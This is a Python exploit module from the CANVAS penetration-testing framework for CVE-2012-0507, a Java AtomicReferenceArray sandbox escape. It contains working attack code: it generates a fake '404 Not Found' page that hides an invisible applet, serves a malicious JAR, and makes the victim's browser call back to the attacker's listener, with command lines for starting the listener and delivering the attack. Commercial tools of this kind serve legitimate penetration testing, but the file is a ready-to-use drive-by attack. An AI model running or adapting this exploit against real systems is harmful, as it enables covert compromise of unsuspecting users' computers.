#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2012
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")
    
import canvasengine
from exploitutils import *
from httpclientside import httpclientside

NAME                            = "Java AtomicReferenceArray Type Confusion Sandbox Bypass"
DESCRIPTION                     = "Java AtomicReferenceArray Type Confusion vulnerability allows an attacker to bypass security restrictions and therefore escape from the sandbox." 
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Sun"
DOCUMENTATION["Repeatability"]  = "Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"]       = "CVE-2012-0507"
DOCUMENTATION["References"]     = """http://weblog.ikvm.net/CommentView.aspx?guid=cd48169a-9405-4f63-9087-798c4a1866d3
http://www.oracle.com/technetwork/topics/security/javacpufeb2012-366318.html"""
DOCUMENTATION["Date public"]    = "02/14/2012"
DOCUMENTATION["Notes"]         = """
There is a Type Confusion vulnerability in java.util.concurrent.atomic.AtomicReferenceArray class.
When creating a new instance of an AtomicReferenceArray the array type has to be specified, however the AtomicReferenceArray.set method
does not properly check the object type being inserted.
This vulnerability can then be used together with some reflection tricks to disable the Java Security Manager to escape the sandbox.

Affected versions
JDK and JRE 7 Update 2 and earlier
JDK and JRE 6 Update 30 and earlier
JDK and JRE 5.0 Update 33 and earlier
SDK and JRE 1.4.2_35 and earlier

Tested on:
    - Windows 7 SP1 with JDK/JRE 7 and 7 update 1
    - Windows 7 SP1 with JDK/JRE 6 update 29
    - Windows 7 SP1 with JDK/JRE 5 update 22
    - Windows XP SP3 with JDK/JRE 7 and 7 update 1

To run from command line, first start the listener (UNIVERSAL):
python commandlineInterface.py -l 192.168.1.10 -p 5555 -v 17
And then run the exploit from clientd:
python ./exploits/clientd/clientd.py -l 192.168.1.10 -d 5555 -O server_port:8080 -O allowed_attack_modules:java_AtomicReferenceArray -O allowed_recon_modules:js_recon -O auto_detect_exploits:0

"""

VERSION                         = "1.0"
PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["UNIX"], ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

TARGETS = { 0 : ["JDK/JRE <= 7 Update 2"],
            1 : ["JDK/JRE <= 6 Update 30"],
            2 : ["JDK/JRE <= 5.0 Update 33"],
           # 3 : ["SDK/JRE <= 1.4.2_35"],
        }


class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        self.htmlfile           = "index.html"
        # filename is used in the actual http server
        self.filename           = self.htmlfile
        self.jarfile            = "javaAtomicReferenceArray.jar"
        # in standalone mode we want it to adhere
        # to manually chosen callback settings ...
        self.autoFind           = False
        # this exploit can not time out ...
        # it remains active in the browser ...
        self.refresh_rate       = 0
        return

    
    def neededListenerTypes(self):
        if self.HTTPMOSDEF:
            if self.useSSLMOSDEF:
                return [canvasengine.HTTPMOSDEF_SSL]
            else:
                return [canvasengine.HTTPMOSDEF]
        else:
            return [canvasengine.UNIVERSAL_MOSDEF]
    
    # Vulnerability detection
    def is_vulnerable( self, info_dict ):
        major, minor, build, patch = self.getJavaVersions(info_dict)
        self.log("Checking if target is vulnerable. Detected Java version: major=%s, minor=%s, build=%s, patch=%s" % (major, minor, build, patch))
        if not major:
            #No Java
            return 0 
        if major == 1:
            if minor == 5:
                if patch <= 33:
                    return 81
            if minor == 6:
                if patch <= 30:
                    return 81
            elif  minor == 7:
                if patch <= 2:
                    return 81
        return 0

    def displayVersions(self):
        for t in TARGETS.keys():
            print "%d: %s" % (t, TARGETS[t][0])
        return
    
    def run(self):
        self.host       = self.target.interface
        self.htmlfile   = self.argsDict.get('htmlfile', self.htmlfile)
        html            = self.makefile()
        rar             = self.makedownloadfile()
        
        self.log("[+] Opening HTML %s for output" % self.htmlfile)
        fd = file(self.htmlfile, 'wb+')
        fd.write(html)
        fd.close()
        self.log("[+] wrote to %s" % self.htmlfile)
        
        self.log("[+] Opening JAR %s for output" % self.jarfile)
        fd = file(self.jarfile, 'wb+')
        fd.write(rar)
        fd.close()
        self.log("[+] Wrote to %s" % self.jarfile)

        self.log("[+] Place both files together in malicious webroot")        
        return 1

    ## SPIKE Proxy Callbacks ...

    def makedownloadfile(self):
        return file('Resources/%s' % self.jarfile, 'rb').read()
        
    def makefile(self):
        html = """
        <html>
            <head>
                <title>404 Not Found</title>
            </head>
            <body>
                <!-- Site 404 Handler Applet -->
                <applet archive="%s" code="SiteError.class" width="0" height="0">
                    <param name="host" value="%s">
                    <param name="port" value="%d">
                    <param name="type" value="%d">
                    <param name="id" value="%d">
                    <param name="conn_type" value="%d">
                    <param name="use_ssl" value="%s">
                </applet>
                <h1>Not Found</h1>
                <p>The requested URL /%s was not found on this server.</p>
                <hr>
            </body>
        </html>
        """ % (self.jarfile,
               self.callback.ip,
               self.callback.port,
               self.engine.getMosdefType(canvasengine.JAVASERVER),
               self.engine.getNewMosdefID(self),
               1 if self.HTTPMOSDEF else 0,
               str(self.useSSLMOSDEF).lower(),
               self.htmlfile) 

        return html
        
    def makesploit(self, clientheader, clientbody):    
        # we are platform independent
        from libs.spkproxy import header, body
        h           = header('SERVER')
        b           = body()
        user_agent  = clientheader.getStrValue(['User-Agent'])
        
        self.log("[+] User agent of connecting host: %s" % user_agent)        
        if clientheader.URL.count(self.htmlfile):
            self.log("[+] Sending HTML")
            b.setBody(self.makefile())
            
        elif clientheader.URL.count(self.jarfile):
            self.log("[+] Sending JAR")
            data = self.makedownloadfile()
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'binary/octet-stream')
            h.addHeader('Connection', 'close')
            b.setBody(data)
            
        elif clientheader.URL.count("done"):
            self.log("Did not load Java applet!")
            return None, None
        else:
            self.log("[+] Redirect to %s" % self.htmlfile)
            h.status = '302'
            h.addHeader('Location', self.htmlfile)
            h.addHeader('Content-Type', 'text/html')

        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    
